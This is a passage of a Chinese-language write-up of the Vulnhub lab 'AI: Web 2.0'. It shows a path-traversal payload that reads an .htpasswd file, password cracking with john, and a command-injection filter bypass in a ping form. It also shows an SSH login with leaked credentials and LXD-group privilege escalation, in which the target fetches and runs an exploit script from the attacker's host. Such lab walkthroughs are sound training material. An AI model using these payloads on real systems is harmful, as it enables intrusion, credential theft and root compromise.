+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>VirtualHost</span> <span class=o>*</span><span class=p>:</span><span class=mi>80</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=c1># The ServerName directive sets the request scheme, hostname and port that</span>
+</span></span><span class=line><span class=cl>	<span class=c1># the server uses to identify itself. This is used when creating</span>
+</span></span><span class=line><span class=cl>	<span class=c1># redirection URLs. In the context of virtual hosts, the ServerName</span>
+</span></span><span class=line><span class=cl>	<span class=c1># specifies what hostname must appear in the request&#39;s Host: header to</span>
+</span></span><span class=line><span class=cl>	<span class=c1># match this virtual host. For the default virtual host (this file) this</span>
+</span></span><span class=line><span class=cl>	<span class=c1># value is not decisive as it is used as a last resort host regardless.</span>
+</span></span><span class=line><span class=cl>	<span class=c1># However, you must set it for any further virtual host explicitly.</span>
+</span></span><span class=line><span class=cl>	<span class=c1>#ServerName www.example.com</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>ServerAdmin</span> <span class=n>webmaster</span><span class=err>@</span><span class=n>localhost</span>
+</span></span><span class=line><span class=cl>	<span class=n>DocumentRoot</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=c1># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span>
+</span></span><span class=line><span class=cl>	<span class=c1># error, crit, alert, emerg.</span>
+</span></span><span class=line><span class=cl>	<span class=c1># It is also possible to configure the loglevel for particular</span>
+</span></span><span class=line><span class=cl>	<span class=c1># modules, e.g.</span>
+</span></span><span class=line><span class=cl>	<span class=c1>#LogLevel info ssl:warn</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>ErrorLog</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_LOG_DIR</span><span class=p>}</span><span class=o>/</span><span class=n>error</span><span class=o>.</span><span class=n>log</span>
+</span></span><span class=line><span class=cl>	<span class=n>CustomLog</span> <span class=o>$</span><span class=p>{</span><span class=n>APACHE_LOG_DIR</span><span class=p>}</span><span class=o>/</span><span class=n>access</span><span class=o>.</span><span class=n>log</span> <span class=n>combined</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=c1># For most configuration files from conf-available/, which are</span>
+</span></span><span class=line><span class=cl>	<span class=c1># enabled or disabled at a global level, it is possible to</span>
+</span></span><span class=line><span class=cl>	<span class=c1># include a line for only one particular virtual host. For example the</span>
+</span></span><span class=line><span class=cl>	<span class=c1># following line enables the CGI configuration for this host only</span>
+</span></span><span class=line><span class=cl>	<span class=c1># after it has been globally disabled with &#34;a2disconf&#34;.</span>
+</span></span><span class=line><span class=cl>	<span class=c1>#Include conf-available/serve-cgi-bin.conf</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=ne>Directory</span> <span class=s2>&#34;/var/www/html/webadmin&#34;</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>		<span class=n>AuthType</span> <span class=n>Basic</span>
+</span></span><span class=line><span class=cl>		<span class=n>AuthName</span> <span class=s2>&#34;Restricted Content&#34;</span>
+</span></span><span class=line><span class=cl>		<span class=n>AuthUserFile</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>apache2</span><span class=o>/.</span><span class=n>htpasswd</span>
+</span></span><span class=line><span class=cl>		<span class=n>Require</span> <span class=n>valid</span><span class=o>-</span><span class=n>user</span>
+</span></span><span class=line><span class=cl>	<span class=o>&lt;/</span><span class=ne>Directory</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>VirtualHost</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>.htpasswd</code> 文件就在 <code>/etc/apache2/.htpasswd</code></p><p>构造payload为/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/
+</span></span></code></pre></td></tr></table></div></div><h3 id=john爆破>john爆破</h3><p>前面的靶场介绍已经留下了线索，用这个词典SecLists/rockyou-45.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s1>&#39;aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/&#39;</span> &gt; hash.txt
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$  find /usr/share/seclists -name <span class=s2>&#34;*rockyou*&#34;</span> 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-withcount.txt.tar.gz
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-60.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-35.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-65.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-45.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-55.txt
+</span></span><span class=line><span class=cl>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ john --wordlist<span class=o>=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-45.txt hash.txt
+</span></span><span class=line><span class=cl>Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;md5crypt&#34;</span>, but the string is also recognized as <span class=s2>&#34;md5crypt-long&#34;</span>
+</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that <span class=nb>type</span> instead
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>md5crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$1</span>$ <span class=o>(</span>and variants<span class=o>)</span> <span class=o>[</span>MD5 512/512 AVX512BW 16x3<span class=o>])</span>
+</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
+</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
+</span></span><span class=line><span class=cl>c.ronaldo        <span class=o>(</span>aiweb2admin<span class=o>)</span>     
+</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE <span class=o>(</span>2026-08-06 23:02<span class=o>)</span> 25.00g/s 153600p/s 153600c/s 153600C/s babyphat1..bitchs
+</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class=line><span class=cl>Session completed.
+</span></span></code></pre></td></tr></table></div></div><ul><li>用户名：aiweb2admin</li><li>密码：c.ronaldo</li></ul><h3 id=账号登陆>账号登陆</h3><p>回到这里/webadmin 用刚刚爆破的账号和密码</p><p>然后页面显示 I disallowed some contents from robots.很明显这里提示当前目录存在robots.txt，访问以下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>User-agent: *
+</span></span><span class=line><span class=cl>Disallow: 
+</span></span><span class=line><span class=cl>Disallow: /H05Tpin9555/
+</span></span><span class=line><span class=cl>Disallow: /S0mextras/
+</span></span></code></pre></td></tr></table></div></div><p>ok，我们挨个访问</p><p>webadmin/H05Tpin9555/ 有一个一个 <strong>Ping IP address</strong> 的表单，典型的命令注入测试点</p><p>/webadmin/S0mextras/ — 可能有敏感文件或提示，不能直接目录爆破</p><h3 id=利用命令执行漏洞>利用命令执行漏洞</h3><p>/H05Tpin9555/这里 验证一下命令注入</p><p>127.0.0.1| ls&ndash;>
+index.php
+style-main.css</p><p>127.0.0.1| pwd&ndash;>/var/www/html/webadmin/H05Tpin9555</p><p>127.0.0.1|cat index.php
+这里暴露的源码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&amp;&amp;&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>    <span class=c1>// 注意：这里是 &#34;| &#34;（管道符+空格），不是 &#34;|&#34;
+</span></span></span><span class=line><span class=cl>    <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>关键漏洞：过滤的是 | （管道符+空格），不是 |（纯管道符）</p><h3 id=存在隐藏文件>存在隐藏文件</h3><p>/S0mextras/这里的提示我们找找这个目录下的文件，或许可以通过这个表单做尝试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find./S0mextras
+</span></span></code></pre></td></tr></table></div></div><p>得到</p><p>../S0mextras/.sshUserCred55512.txt
+../S0mextras/index.html</p><p>直接访问/webadmin/S0mextras/.sshUserCred55512.txt</p><p>得到</p><p>User: n0nr00tuser
+Cred: zxowieoi4sdsadpEClDws1sf</p><h2 id=ssh登陆>SSH登陆</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ssh n0nr00tuser@10.10.10.134
+</span></span><span class=line><span class=cl>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span class=line><span class=cl>** This session may be vulnerable to <span class=s2>&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span class=line><span class=cl>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span class=line><span class=cl>n0nr00tuser@10.10.10.134<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 18.04.3 LTS <span class=o>(</span>GNU/Linux 4.15.0-58-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Fri Aug  <span class=m>7</span> 03:53:36 UTC <span class=m>2026</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:  0.08              Processes:            <span class=m>171</span>
+</span></span><span class=line><span class=cl>  Usage of /:   89.7% of 3.87GB   Users logged in:      <span class=m>0</span>
+</span></span><span class=line><span class=cl>  Memory usage: 16%               IP address <span class=k>for</span> ens32: 10.10.10.134
+</span></span><span class=line><span class=cl>  Swap usage:   0%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt; / is using 89.7% of 3.87GB
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+</span></span><span class=line><span class=cl>   just raised the bar <span class=k>for</span> easy, resilient and secure K8s cluster deployment.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>92</span> packages can be updated.
+</span></span><span class=line><span class=cl><span class=m>0</span> updates are security updates.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>*** System restart required ***
+</span></span><span class=line><span class=cl>Last login: Sun Sep  <span class=m>1</span> 05:35:18 <span class=m>2019</span> from 192.168.187.1
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$
+</span></span></code></pre></td></tr></table></div></div><h2 id=权限提升>权限提升</h2><p>先做一下必要的信息收集</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>n0nr00tuser<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>n0nr00tuser<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>n0nr00tuser<span class=o>)</span>,108<span class=o>(</span>lxd<span class=o>)</span>
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ whoami
+</span></span><span class=line><span class=cl>n0nr00tuser
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/home/n0nr00tuser
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ uname -a
+</span></span><span class=line><span class=cl>Linux aiweb2host 4.15.0-58-generic <span class=c1>#64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ cat /etc/os-release
+</span></span><span class=line><span class=cl><span class=nv>NAME</span><span class=o>=</span><span class=s2>&#34;Ubuntu&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>VERSION</span><span class=o>=</span><span class=s2>&#34;18.04.3 LTS (Bionic Beaver)&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>ID</span><span class=o>=</span>ubuntu
+</span></span><span class=line><span class=cl><span class=nv>ID_LIKE</span><span class=o>=</span>debian
+</span></span><span class=line><span class=cl><span class=nv>PRETTY_NAME</span><span class=o>=</span><span class=s2>&#34;Ubuntu 18.04.3 LTS&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>VERSION_ID</span><span class=o>=</span><span class=s2>&#34;18.04&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>HOME_URL</span><span class=o>=</span><span class=s2>&#34;https://www.ubuntu.com/&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>SUPPORT_URL</span><span class=o>=</span><span class=s2>&#34;https://help.ubuntu.com/&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>BUG_REPORT_URL</span><span class=o>=</span><span class=s2>&#34;https://bugs.launchpad.net/ubuntu/&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>PRIVACY_POLICY_URL</span><span class=o>=</span><span class=s2>&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>VERSION_CODENAME</span><span class=o>=</span>bionic
+</span></span><span class=line><span class=cl><span class=nv>UBUNTU_CODENAME</span><span class=o>=</span>bionic
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ 
+</span></span></code></pre></td></tr></table></div></div><p>可以看到lxd组，同时我已经验证做sudo 和suid 提权的失败，这可能是我第一次需要lxd提权的</p><p>先对lxd简要了解一下</p><p>LXD 是 Linux 容器管理工具。如果用户在 <code>lxd</code> 组，可以利用 LXD 创建特权容器，挂载宿主机的根目录，从而获取 root 权限</p><h3 id=提权向量lxd-容器逃逸>提权向量：LXD 容器逃逸</h3><p>LXD 是 Linux 容器管理工具。如果用户在 lxd 组，可以利用 LXD 创建特权容器，挂载宿主机根目录，从而获取 root 权限</p><p>检查lxd状态</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ lxc --version
+</span></span><span class=line><span class=cl>3.0.3
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ lxc image list
+</span></span><span class=line><span class=cl>+-------+-------------+--------+-------------+------+------+-------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> ALIAS <span class=p>|</span> FINGERPRINT <span class=p>|</span> PUBLIC <span class=p>|</span> DESCRIPTION <span class=p>|</span> ARCH <span class=p>|</span> SIZE <span class=p>|</span> UPLOAD DATE <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-------+-------------+--------+-------------+------+------+-------------+
+</span></span><span class=line><span class=cl>n0nr00tuser@aiweb2host:~$ lxc list
+</span></span><span class=line><span class=cl>+------------+---------+------+------+------------+-----------+
+</span></span><span class=line><span class=cl><span class=p>|</span>    NAME    <span class=p>|</span>  STATE  <span class=p>|</span> IPV4 <span class=p>|</span> IPV6 <span class=p>|</span>    TYPE    <span class=p>|</span> SNAPSHOTS <span class=p>|</span>
+</span></span><span class=line><span class=cl>+------------+---------+------+------+------------+-----------+
+</span></span><span class=line><span class=cl><span class=p>|</span> UbuntuMini <span class=p>|</span> STOPPED <span class=p>|</span>      <span class=p>|</span>      <span class=p>|</span> PERSISTENT <span class=p>|</span> <span class=m>0</span>         <span class=p>|</span>
+</span></span><span class=line><span class=cl>+------------+---------+------+------+------------+-----------+
+</span></span></code></pre></td></tr></table></div></div><h2 id=root-权限获取>Root 权限获取</h2><p>虽然LXD 提权本质不是 exploit-db 漏洞，而是错误权限配置 + LXD设计特性，但是在kali上，任可以继续利用漏洞库寻找有关lxd提权的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>searchsploit lxd                                                        
+</span></span></code></pre></td></tr></table></div></div><p>Ubuntu 18.04 - &rsquo;lxd&rsquo; Privilege Escalation | linux/local/46978.sh</p><p>然后</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ cp /usr/share/exploitdb/exploits/linux/local/46978.sh ~/Labs/Vulnhub/AiWeb2
+</span></span><span class=line><span class=cl>                          
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ls
+</span></span><span class=line><span class=cl>46978.sh  hash.txt  nmapscan  reports
+</span></span><span class=line><span class=cl>                        
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ python3 -m http.server <span class=m>8000</span>
+</span></span></code></pre></td></tr></table></div></div><p>漏了关键东西</p><p>我们需要镜像</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine  
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>   
+</span></span><span class=line><span class=cl>└─$ ls                                                                                                                      
+</span></span><span class=line><span class=cl>46978.sh  build-alpine  hash.txt  nmapscan  reports                                           
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>                     
+</span></span><span class=line><span class=cl>└─$ sudo bash build-alpine 
+</span></span></code></pre></td></tr></table></div></div><p>在靶机上</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl>wget http://10.10.10.10:8000/46978.sh
+</span></span><span class=line><span class=cl>wget http://10.10.10.10:8000/alpine-v3.24-x86_64-20260807_0114.tar.gz
+</span></span><span class=line><span class=cl>chmod +x 46978.sh
+</span></span><span class=line><span class=cl>bash 46978.sh -f alpine-v3.24-x86_64-20260807_0114.tar.gz
+</span></span></code></pre></td></tr></table></div></div><p>接着发现，我们已经是Root了</p><h2 id=寻找flag>寻找flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>~ <span class=c1># find / -name flag* </span>
+</span></span><span class=line><span class=cl>/mnt/root/root/flag.txt
+</span></span><span class=line><span class=cl>~ <span class=c1># cat /mnt/root/root/flag.txt</span>
+</span></span><span class=line><span class=cl><span class=c1>####################################################</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                 AI: WEB 2.0                      #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#               Congratulation!!!                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
